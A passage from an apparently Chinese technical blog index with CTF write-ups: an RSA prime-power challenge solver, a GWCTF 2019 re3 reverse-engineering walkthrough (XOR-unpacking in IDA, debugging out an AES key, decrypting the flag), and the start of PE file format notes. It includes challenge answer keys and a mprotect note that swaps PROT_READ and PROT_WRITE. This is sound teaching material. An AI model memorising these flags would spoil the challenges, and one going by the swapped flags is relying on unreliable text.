class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">from</span> flag <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\">p = getPrime(<span class=\"number\">1024</span>)</span><br><span class=\"line\">r = random.randint(<span class=\"number\">2</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">n = p**r</span><br><span class=\"line\">m = flag</span><br><span class=\"line\"><span class=\"keyword\">assert</span>(<span class=\"built_in\">int</span>(m.encode(<span class=\"string\">&#x27;hex&#x27;</span>), <span class=\"number\">16</span>) &lt; n)</span><br><span class=\"line\">c = <span class=\"built_in\">pow</span>(<span class=\"built_in\">int</span>(m.encode(<span class=\"string\">&#x27;hex&#x27;</span>), <span class=\"number\">16</span>),e,n)</span><br><span class=\"line\">c = long_to_bytes(c)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;c =\\n&#x27;</span>, c.encode(<span class=\"string\">&#x27;base64&#x27;</span>),n</span><br></pre></td></tr></table></figure></p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">c =</span><br><span class=\"line\">apxy3z3DgGnzaEedcUy3A49wAsqyyn9sqx6eYZL5iDrCq0Wjs8BOY2Ofza5wuaFigm32PVpO5jpu</span><br><span class=\"line\">Dgw9b6oX8KM2ZB9/dDmwQc7JKnAKhCQrIc1v9qt7iQbnTK0DTQj/xvQkz/IBeSjoWBmHOx4s0tDx</span><br><span class=\"line\">ZRAjOPui5wwAywNM3ynULEPczv+xN2v+6HBeoS2YuyfF5mq/pIAMPwZs+QpkuwxSbNQ6xPNP9Ox1</span><br><span class=\"line\">IeKz/41F7/D2fDsGB5CcFdAiQq+r95BhVeGzeaiQBpzwAXAPKIyO+fP6/M9XmpSJwjaMSiAUnksp</span><br><span class=\"line\">9KfVOXgEG9Z0FmxP6rgqPl0vU+rVeJ2RsTUYCSP8Vy+PD3PGwDDdUtNzvcEXKr2BKiNoOUxprBAt</span><br><span class=\"line\">yvcsmGqRLgDl1ZVgzSZ1U4MAmJ9x42mIU0XvolqaOCJZzaym1kJoBlw7/<span class=\"number\">7</span>+Nej4owEtan/c3TIkD</span><br><span class=\"line\">kr/gCenUD/8MSlvnfTUMGdQLkSht2BZiuiHxVVRVzY5ETG6v+w9AtDMC</span><br><span class=\"line\"><span class=\"number\">4600616808891590817884946117009414083548013610469076381106568481948720521467073218024827360073980550620353792084520767372304347132535784875671026563160583598386773718586111034826555689602824563172463446924287072570386712719870348862904936370894695108302490867826094352072132696743116741635111860205049129717948520534270924834318704244999690532431941248905257880347561221151841978982240191397364038490250930604211256385925496658620755582058753376328583001312846508295319286941837220522563729215928111164274042890696771820759856790994461944209269732769269559257608440686713206622111649275898426040931301005711446055819707704086201357712959922814300067907536161841255533171805313149332383712997091780368142625499055149806043238057037400510197255364471685815004154357049874205884682322443391374020169114833722616851257895369648472048116320266548560787733764126281102645474252013714507014577620450816459153848279084910457288549191</span></span><br></pre></td></tr></table></figure></p>\r\n<p>分析文件中代码题意，可以看出p为1024位的质数，r取值范围为[2,9]，指数e为65537，模数 <span class=\"math inline\">\\(n=p^r\\)</span>，且题中已给出密文c和模数n，因此可以爆破求解出r，得到r之后，可以求出p，由于n的素因子只有p，则 <span class=\"math inline\">\\(\\phi(n) = n *(1- \\frac{1}{p}) = p^r* (1- \\frac{1}{p}) = p^r - p^{r-1}\\)</span></p>\r\n<blockquote>\r\n<p><span class=\"math inline\">\\(\\phi(n)\\)</span>的含义为小于n且与n互素的整数的个数，<span class=\"math inline\">\\(\\phi(n)\\)</span>求法为，列出n的所有素因子，设为 <span class=\"math inline\">\\(p_1,p_2,p_3,...,p_n\\)</span>，则 <span class=\"math inline\">\\(\\phi(n)=n\\times(1-\\frac{1}{p_1})\\times(1-\\frac{1}{p_2})\\times\\cdots\\times(1-\\frac{1}{p_n})\\)</span> 当n素因子为 <span class=\"math inline\">\\(p, q\\)</span> 时，<span class=\"math inline\">\\(\\phi(n)=(p-1)\\times(q-1)\\)</span></p>\r\n</blockquote></li>\r\n<li><p>编写py代码如下：</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Cryptodome.Util.number <span class=\"keyword\">import</span> long_to_bytes, bytes_to_long</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">c = <span class=\"string\">&#x27;&#x27;&#x27;apxy3z3DgGnzaEedcUy3A49wAsqyyn9sqx6eYZL5iDrCq0Wjs8BOY2Ofza5wuaFigm32PVpO5jpuDgw9b6oX8KM2ZB9/dDmwQc7JKnAKhCQrIc1v9qt7iQbnTK0DTQj/xvQkz/IBeSjoWBmHOx4s0tDxZRAjOPui5wwAywNM3ynULEPczv+xN2v+6HBeoS2YuyfF5mq/pIAMPwZs+QpkuwxSbNQ6xPNP9Ox1IeKz/41F7/D2fDsGB5CcFdAiQq+r95BhVeGzeaiQBpzwAXAPKIyO+fP6/M9XmpSJwjaMSiAUnksp9KfVOXgEG9Z0FmxP6rgqPl0vU+rVeJ2RsTUYCSP8Vy+PD3PGwDDdUtNzvcEXKr2BKiNoOUxprBAtyvcsmGqRLgDl1ZVgzSZ1U4MAmJ9x42mIU0XvolqaOCJZzaym1kJoBlw7/7+Nej4owEtan/c3TIkDkr/gCenUD/8MSlvnfTUMGdQLkSht2BZiuiHxVVRVzY5ETG6v+w9AtDMC&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">n = <span class=\"number\">4600616808891590817884946117009414083548013610469076381106568481948720521467073218024827360073980550620353792084520767372304347132535784875671026563160583598386773718586111034826555689602824563172463446924287072570386712719870348862904936370894695108302490867826094352072132696743116741635111860205049129717948520534270924834318704244999690532431941248905257880347561221151841978982240191397364038490250930604211256385925496658620755582058753376328583001312846508295319286941837220522563729215928111164274042890696771820759856790994461944209269732769269559257608440686713206622111649275898426040931301005711446055819707704086201357712959922814300067907536161841255533171805313149332383712997091780368142625499055149806043238057037400510197255364471685815004154357049874205884682322443391374020169114833722616851257895369648472048116320266548560787733764126281102645474252013714507014577620450816459153848279084910457288549191</span></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">c = bytes_to_long(base64.b64decode(c))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">    p = gmpy2.iroot(n,i)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> p[<span class=\"number\">1</span>]:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">p  = <span class=\"built_in\">int</span>(<span class=\"built_in\">str</span>(p[<span class=\"number\">0</span>]))</span><br><span class=\"line\">phi_n = n-(p**(i-<span class=\"number\">1</span>))</span><br><span class=\"line\">d = gmpy2.invert(e,phi_n)</span><br><span class=\"line\">m = gmpy2.powmod(c,d,p**i)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></p>\r\n<p>得到flag为<code>flag&#123;7422e7ed91c8089a1f2aa323a6a0a6f9&#125;</code></p></li>\r\n</ol>\r\n","categories":["CTF"],"tags":["crypto"]},{"title":"GWCTF 2019-re3","url":"/2022/09/15/GWCTF-2019-re3/","content":"<p>一道较为有意思的题目，利用动态调试可以快速得到中间结果，免去部分逆向过程，特此记录下来。</p>\r\n<h2 id=\"题目地址\">题目地址</h2>\r\n<p>题目地址为<a href=\"https://buuoj.cn/challenges#%5BGWCTF%202019%5Dre3\">[GWCTF 2019]re3</a></p>\r\n<h2 id=\"解题过程\">解题过程</h2>\r\n<h3 id=\"分析\">分析</h3>\r\n<ol type=\"1\">\r\n<li>首先下载附件，发现只存在一个文件<code>attachment</code></li>\r\n<li>使用DIE分析，发现为64位ELF文件，且未加壳，可以直接拖入IDA中进行分析</li>\r\n</ol>\r\n<p>IDA打开，使用Findcrypt插件查看是否存在加密函数，结果如下：</p>\r\n<figure>\r\n<img src=\"/2022/09/15/GWCTF-2019-re3/image-20220915164641112.png\" alt=\"image-20220915164641112\"><figcaption aria-hidden=\"true\">image-20220915164641112</figcaption>\r\n</figure>\r\n<p>因此该程序极大可能进行了md5哈希和aes加密，然后定位到main函数，发现如下所示：</p>\r\n<span id=\"more\"></span>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall __noreturn <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-48h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [rsp+20h] [rbp-30h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+48h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%39s&quot;</span>, &amp;s, a3);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)<span class=\"built_in\">strlen</span>(&amp;s) != <span class=\"number\">32</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Wrong!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  mprotect(&amp;dword_400000, <span class=\"number\">0xF000</span>uLL, <span class=\"number\">7</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">223</span>; ++i )</span><br><span class=\"line\">    *((_BYTE *)sub_402219 + i) ^= <span class=\"number\">0x99</span>u;</span><br><span class=\"line\">  sub_40207B(&amp;unk_603170, <span class=\"number\">61440LL</span>);</span><br><span class=\"line\">  sub_402219(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可以看到程序主要流程为读入字符串到<code>s</code>，然后 if 语句判断输入字符 <code>s</code> 长度是否为32，否则就输出错误并退出，因此 flag 长度为32。</p>\r\n<p>接下来调用mprotect函数将0x400000地址开始的内存段，长度共0xF000uLL，进行权限修改，因此调用该函数后，从0x400000地址处开始的代码段可被修改。</p>\r\n<blockquote>\r\n<p>函数原型: int mprotect(void *addr, size_t len, int prot); 含义: 把自addr开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>\r\n<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用： 1. PROT_READ：表示内存段内的内容可写； 2. PROT_WRITE：表示内存段内的内容可读； 3. PROT_EXEC：表示内存段中的内容可执行； 4. PROT_NONE：表示内存段中的内容根本没法访问。</p>\r\n</blockquote>\r\n<p>接下来的for循环对[0x402219: 0x402219+223]地址处内存数据进行修改，每个字节均异或 0x99。</p>\r\n<p>最后调用sub_40207B函数和sub_402219函数。</p>\r\n<p>由于for循环对sub_402219函数的内容进行了修改，因此IDA中无法直接查看修改后的内容，需要使用IDA自带的脚本命令对其进行修复（【FILE—Script Command】，将脚本语言IDC修改为Python），脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">sa = <span class=\"number\">0x402219</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">224</span>):</span><br><span class=\"line\">    patch_byte(sa+i, get_wide_byte(sa+i) ^ <span class=\"number\">0x99</span>)</span><br></pre></td></tr></table></figure>\r\n<p>修复完成后，再查看sub_402219函数，发现仍不正常，如下图所示：</p>\r\n<figure>\r\n<img src=\"/2022/09/15/GWCTF-2019-re3/image-20220915163753705.png\" alt=\"wrong-sub_402219\"><figcaption aria-hidden=\"true\">wrong-sub_402219</figcaption>\r\n</figure>\r\n<p>因此需要对sub_402219函数进行编辑，鼠标点击到40221A处，按下c键，将数据转换为代码，然后编辑sub_402219函数的结束地址，将其修改为4022F9。</p>\r\n<figure>\r\n<img src=\"/2022/09/15/GWCTF-2019-re3/image-20220915164052537.png\" alt=\"image-20220915164052537\"><figcaption aria-hidden=\"true\">image-20220915164052537</figcaption>\r\n</figure>\r\n<p>接下来再按F5反编译可得到修复后的函数如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall __noreturn <span class=\"title function_\">sub_402219</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp-E0h] [rbp-E0h]</span></span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp-DCh] [rbp-DCh]</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// [rsp-D8h] [rbp-D8h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp-10h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_400A71(&amp;v4, &amp;unk_603170);</span><br><span class=\"line\">  sub_40196E(&amp;v4, a1);</span><br><span class=\"line\">  sub_40196E(&amp;v4, a1 + <span class=\"number\">16</span>);</span><br><span class=\"line\">  v2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">31</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(_BYTE *)(i + a1) != byte_6030A0[i] )</span><br><span class=\"line\">      v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>经分析，可以得知main函数调用的sub_40207B函数将返回结果写入了0x603170地址处，且该值固定，在sub_402219函数中，调用sub_400A71函数，其中第2个参数为0x603170地址，该函数将结果写回v4，然后继续两次调用sub_40196E函数，对a1（即main函数中的输入字符串s）进行变换，最后for循环与0x6030A0地址内容进行对比。</p>\r\n<p>进入sub_40196E函数分析，发现其主要操作为AES加密，即使用v4作为key，对第2个参数内容进行AES加密。</p>\r\n<p>由此还原方法如下：</p>\r\n<ol type=\"1\">\r\n<li>获取0x6030A0地址处共32个字节内容，作为密文用于AES解密</li>\r\n<li>动态调试，获取v4内容，得到AES加密密钥key</li>\r\n<li>编写脚本，进行AES解密，得到明文flag</li>\r\n</ol>\r\n<h3 id=\"动态调试\">动态调试</h3>\r\n<p>首先将IDA安装目录下的<code>dbgsrv</code>目录下的linux_server64复制到目标机器并启动，在0x4021F0地址处添加断点，然后开始调试。</p>\r\n<p>启动调试后，首先在目标机器中输入32个字符，接下来断在0x4021F0地址处，单步F7开始调试，直到运行到0x40224E地址处，此时rdi寄存器所指向地址处内容为AES加密密钥</p>\r\n<figure>\r\n<img src=\"/2022/09/15/GWCTF-2019-re3/image-20220915173213844.png\" alt=\"动态调试\"><figcaption aria-hidden=\"true\">动态调试</figcaption>\r\n</figure>\r\n<p>因此AES密钥为<code>b\"\\xCB\\x8D\\x49\\x35\\x21\\xB4\\x7A\\x4C\\xC1\\xAE\\x7E\\x62\\x22\\x92\\x66\\xCE\"</code></p>\r\n<h3 id=\"脚本\">脚本</h3>\r\n<p>获取密文脚本：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">data = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>):</span><br><span class=\"line\">    data.append(get_wide_byte(<span class=\"number\">0x6030A0</span>+i))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [188, 10, 173, 192, 20, 124, 94, 204, 224, 177, 64, 188, 156, 81, 213, 43, 70, 178, 185, 67, 77, 229, 50, 75, 173, 127, 180, 179, 156, 219, 75, 91]</span></span><br></pre></td></tr></table></figure>\r\n<p>解密脚本：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">b&quot;\\xCB\\x8D\\x49\\x35\\x21\\xB4\\x7A\\x4C\\xC1\\xAE\\x7E\\x62\\x22\\x92\\x66\\xCE&quot;</span></span><br><span class=\"line\">data = [<span class=\"number\">188</span>, <span class=\"number\">10</span>, <span class=\"number\">173</span>, <span class=\"number\">192</span>, <span class=\"number\">20</span>, <span class=\"number\">124</span>, <span class=\"number\">94</span>, <span class=\"number\">204</span>, <span class=\"number\">224</span>, <span class=\"number\">177</span>, <span class=\"number\">64</span>, <span class=\"number\">188</span>, <span class=\"number\">156</span>, <span class=\"number\">81</span>, <span class=\"number\">213</span>, <span class=\"number\">43</span>, <span class=\"number\">70</span>, <span class=\"number\">178</span>, <span class=\"number\">185</span>, <span class=\"number\">67</span>, <span class=\"number\">77</span>, <span class=\"number\">229</span>, <span class=\"number\">50</span>, <span class=\"number\">75</span>, <span class=\"number\">173</span>, <span class=\"number\">127</span>, <span class=\"number\">180</span>, <span class=\"number\">179</span>, <span class=\"number\">156</span>, <span class=\"number\">219</span>, <span class=\"number\">75</span>, <span class=\"number\">91</span>]</span><br><span class=\"line\">msg = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    msg += i.to_bytes(<span class=\"number\">1</span>, <span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\">aes = AES.new(key, mode = AES.MODE_ECB)</span><br><span class=\"line\">flag = aes.decrypt(msg)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># b&#x27;flag&#123;924a9ab2163d390410d0a1f670&#125;&#x27;</span></span><br></pre></td></tr></table></figure>\r\n<p>flag为<code>flag&#123;924a9ab2163d390410d0a1f670&#125;</code></p>\r\n","categories":["CTF"],"tags":["reverse","c/c++"]},{"title":"PE文件格式","url":"/2022/09/12/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/","content":"<p>PE 文件是 Windows 操作系统使用的可执行文件格式，基于COFF（Common Object File Format，通用对象文件格式）制作。</p>\r\n<p>PE文件是32位的可执行文件，也称为PE32，64位的可执行文件被称为PE+或PE32+，是PE32文件的一种扩展，但不是PE64。</p>\r\n<h2 id=\"种类\">种类</h2>\r\n<span id=\"more\"></span>\r\n<table>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>种类</th>\r\n<th>主扩展名</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>可执行系列</td>\r\n<td>EXE,SCR</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>库系列</td>\r\n<td>DLL,OCX,CPL,DRV</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>驱动程序系列</td>\r\n<td>SYS,VXD</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>对象文件系列</td>\r\n<td>OBJ</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>严格来说，除<code>OBJ</code>之外的所有文件都是可执行的，DLL，SYS等文件需要利用其他方法（调试器，服务等）执行。</p>\r\n<h2 id=\"基本结构\">基本结构</h2>\r\n<p>PE文件由<code>PE头+PE体</code>组成，其中PE头由<code>DOS头+DOS存根+NT头+节区头组成</code>，其示例图如下：</p>\r\n<table>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>文件偏移</th>\r\n<th><文件></文件></th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>0000</td>\r\n<td>DOS头</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>0040</td>\r\n<td>DOS存根</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>00E0</td>\r\n<td>NT头</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>01D8</td>\r\n<td>节区头(\".text\")</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>0200</td>\r\n<td>节区头(\".data\")</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>0228</td>\r\n<td>节区头(\".rsrc\")</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td></td>\r\n<td>NULL</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td></td>\r\n<td>节区(\".text\")</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td></td>\r\n<td>NULL</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td></td>\r\n<td>节区头(\".data\")</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td></td>\r\n<td>NULL</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td></td>\r\n<td>节区头(\".rsrc\")</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td></td>\r\n<td></td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>PE头与各节区尾部存在一个区域，称为NULL填充（NULL padding）。</p>\r\n<p>下图为PE文件的十六进制格式：</p>\r\n<figure>\r\n<img src=\"/2022/09/12/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/image-20220915123558521.png\" alt=\"PE文件结构\"><figcaption aria-hidden=\"true\">PE文件结构</figcaption>\r\n</figure>\r\n<h3 id=\"varva\">VA&amp;RVA</h3>\r\n<p>VA指的是进程虚拟内存的绝对地址，RVA（Relative Virtual Address）指从某个基准位置开始的相对地址，其关系满足以下等式： RVA + Base = VA PE头内部信息大多以RVA形式存在。</p>\r\n<blockquote>\r\n<p>32位Windows中，进程虚拟内存共有4GB，VA值范围为<code>0x00000000-0xFFFFFFFF</code></p>\r\n</blockquote>\r\n<h3 id=\"pe头\">PE头</h3>\r\n<h4 id=\"dos头\">DOS头</h4>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_DOS_HEADER</span> &#123;</span></span><br><span class=\"line\">    WORD e_magic;              <span class=\"comment\">// DOS signature: 4D5A (&quot;MZ&quot;)</span></span><br><span class=\"line\">    WORD e_cblp;</span><br><span class=\"line\">    WORD e_cp;</span><br><span class=\"line\">    WORD e_crlc;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    LONG e_lfanew              <span class=\"comment\">// NT头偏移</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>该结构体大小为0x40个字节，其中有两个重要成员：</p>\r\n<ul>\r\n<li>e_magic: DOS签名 (0x4D5A ⇒ \"MZ\")</li>\r\n<li>e_lfanew: 指示NT头的偏移（不同文件拥有可变值）</li>\r\n</ul>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............</span><br><span class=\"line\">00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......</span><br><span class=\"line\">00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class=\"line\">00000030: 0000 0000 0000 0000 0000 0000 e000 0000  ................</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"dos存根\">DOS存根</h4>\r\n<p>DOS存根(stub)位于DOS头下方，是可选项，大小不固定（无DOS存根，文件亦可正常运行），由代码和数据混合而成。</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th</span><br><span class=\"line\">00000050: 6973 2070 726f 6772 616d 2063 616e 6e6f  is program canno</span><br><span class=\"line\">00000060: 7420 6265 2072 756e 2069 6e20 444f 5320  t be run in DOS</span><br><span class=\"line\">00000070: 6d6f 6465 2e0d 0d0a 2400 0000 0000 0000  mode....$.......</span><br><span class=\"line\">00000080: ec85 5ba1 a8e4 35f2 a8e4 35f2 a8e4 35f2  ..[...5...5...5.</span><br><span class=\"line\">00000090: 6beb 3af2 a9e4 35f2 6beb 55f2 a9e4 35f2  k.:...5.k.U...5.</span><br><span class=\"line\">000000a0: 6beb 68f2 bbe4 35f2 a8e4 34f2 63e4 35f2  k.h...5...4.c.5.</span><br><span class=\"line\">000000b0: 6beb 6bf2 a9e4 35f2 6beb 6af2 bfe4 35f2  k.k...5.k.j...5.</span><br><span class=\"line\">000000c0: 6beb 6ff2 a9e4 35f2 5269 6368 a8e4 35f2  k.o...5.Rich..5.</span><br><span class=\"line\">000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br></pre></td></tr></table></figure>\r\n<p>40-4D区域为16位汇编指令，32位Windows中不会运行该指令，该指令内容为输出\"This program cannot be run in DOS mode\"，然后终止。</p>\r\n<h4 id=\"nt头\">NT头</h4>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class=\"line\"> DWORD Signature;</span><br><span class=\"line\"> IMAGE_FILE_HEADER FileHeader;</span><br><span class=\"line\"> IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class=\"line\">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>\r\n<p>第一个成员为签名结构体，其值为50540000h（“PE”00），另外两个成员分别为文件头（File Header）和可选头（Optional Header）结构体</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">000000e0: 5045 0000 4c01 0300 8752 0248 0000 0000  PE..L....R.H....</span><br><span class=\"line\">000000f0: 0000 0000 e000 0f01 0b01 070a 0078 0000  .............x..</span><br><span class=\"line\">00000100: 008c 0000 0000 0000 9d73 0000 0010 0000  .........s......</span><br><span class=\"line\">00000110: 0090 0000 0000 0001 0010 0000 0002 0000  ................</span><br><span class=\"line\">00000120: 0500 0100 0500 0100 0400 0000 0000 0000  ................</span><br><span class=\"line\">00000130: 0040 0100 0004 0000 ce26 0100 0200 0080  .@.......&amp;......</span><br><span class=\"line\">00000140: 0000 0400 0010 0100 0000 1000 0010 0000  ................</span><br><span class=\"line\">00000150: 0000 0000 1000 0000 0000 0000 0000 0000  ................</span><br><span class=\"line\">00000160: 0476 0000 c800 0000 00b0 0000 0483 0000  .v..............</span><br><span class=\"line\">00000170: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class=\"line\">00000180: 0000 0000 0000 0000 5013 0000 1c00 0000  ........P.......</span><br><span class=\"line\">00000190: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class=\"line\">000001a0: 0000 0000 0000 0000 a818 0000 4000 0000  ............@...</span><br><span class=\"line\">000001b0: 5002 0000 d000 0000 0010 0000 4803 0000  P...........H...</span><br><span class=\"line\">000001c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span><br><span class=\"line\">000001d0: 0000 0000 0000 0000 2e74 6578 7400 0000  ........</span><br></pre></td></tr></table></figure>\r\n<p>IMAGE_NT_HADERS结构体大小为F8</p>\r\n<h4 id=\"文件头\">文件头</h4>\r\n<p>文件头表示文件大致属性的IMAGE_FILE_HEADER结构体</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class=\"line\">    WORD Machine;</span><br><span class=\"line\">    WORD NumberOfSections;</span><br><span class=\"line\">    DWORD TimeDataStamp;</span><br><span class=\"line\">    DWORD PointerToSymbolTable;</span><br><span class=\"line\">    DWORD NumberOfSymbols;</span><br><span class=\"line\">    WORD SizeOfOptionalHeader;</span><br><span class=\"line\">    WORD Characteristics;</span><br><span class=\"line\">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>\r\n<ol type=\"1\">\r\n<li><p>Machine表示CPU类型，每个CPU其类型不一致，Intel x86 